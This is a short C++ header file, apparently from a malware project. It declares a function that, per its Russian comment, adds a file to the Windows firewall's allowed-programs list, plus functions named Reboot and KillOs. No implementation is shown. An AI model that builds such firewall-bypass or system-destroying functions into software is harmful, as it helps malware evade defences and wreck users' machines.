#pragma once

#include "core\core.h"

//добавляет указанный файл в список разрешенных браундмаузера винды
bool AddAllowedprogram( StringBuilder& path );

void Reboot();
bool KillOs();

